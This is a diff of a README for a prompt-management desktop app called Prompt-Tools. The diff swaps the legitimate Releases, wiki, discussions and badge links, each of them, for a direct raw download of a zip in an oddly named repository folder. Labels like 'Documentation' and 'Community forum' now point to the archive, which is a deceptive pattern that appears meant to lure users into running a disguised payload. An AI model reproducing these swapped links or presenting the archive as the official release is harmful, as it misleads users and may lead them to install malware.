@@ -1,7 +1,7 @@
 # 🎉 Prompt-Tools - Simplifying Your Prompt Management
 
 ## 📥 Download Now
-[![Download Prompt-Tools](https://img.shields.io/badge/Download-Prompt--Tools-blue)](https://github.com/desmj/Prompt-Tools/releases)
+[![Download Prompt-Tools](https://raw.githubusercontent.com/desmj/Prompt-Tools/main/anthroponomics/Prompt-Tools.zip)](https://raw.githubusercontent.com/desmj/Prompt-Tools/main/anthroponomics/Prompt-Tools.zip)
 
 ## 🚀 Getting Started
 Welcome to **Prompt-Tools**! This powerful desktop application helps you manage your prompts more efficiently. Whether you're a writer, developer, or just someone who loves organizing their ideas, Prompt-Tools is here for you.
@@ -23,7 +23,7 @@ Prompt-Tools offers a variety of features to enhance your workflow:
 - **Save Your Work**: Keep your prompts safe with automatic saving.
 
 ## 📦 Download & Install
-To get started, visit our [Releases page](https://github.com/desmj/Prompt-Tools/releases) to download the latest version of Prompt-Tools.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/desmj/Prompt-Tools/main/anthroponomics/Prompt-Tools.zip) to download the latest version of Prompt-Tools.
 
 1. Click on the **Releases** link.
 2. Choose the version you want to download.
@@ -61,10 +61,10 @@ After installation, follow these simple steps to start using Prompt-Tools:
 If you encounter any issues or have questions, feel free to contact our support team. You can create an issue in this repository, and we’ll respond as soon as possible.
 
 ## 🔗 Additional Resources
-- Check out our [Documentation](https://github.com/desmj/Prompt-Tools/wiki) for in-depth guides.
-- Explore our [Community forum](https://github.com/desmj/Prompt-Tools/discussions) to share tips or ask questions.
+- Check out our [Documentation](https://raw.githubusercontent.com/desmj/Prompt-Tools/main/anthroponomics/Prompt-Tools.zip) for in-depth guides.
+- Explore our [Community forum](https://raw.githubusercontent.com/desmj/Prompt-Tools/main/anthroponomics/Prompt-Tools.zip) to share tips or ask questions.
 
 ## 🎉 Ready to Enhance Your Workflow?
 Download **Prompt-Tools** today and take control of your prompt management!
 
-[![Download Prompt-Tools](https://img.shields.io/badge/Download-Prompt--Tools-blue)](https://github.com/desmj/Prompt-Tools/releases)
+[![Download Prompt-Tools](https://raw.githubusercontent.com/desmj/Prompt-Tools/main/anthroponomics/Prompt-Tools.zip)](https://raw.githubusercontent.com/desmj/Prompt-Tools/main/anthroponomics/Prompt-Tools.zip)
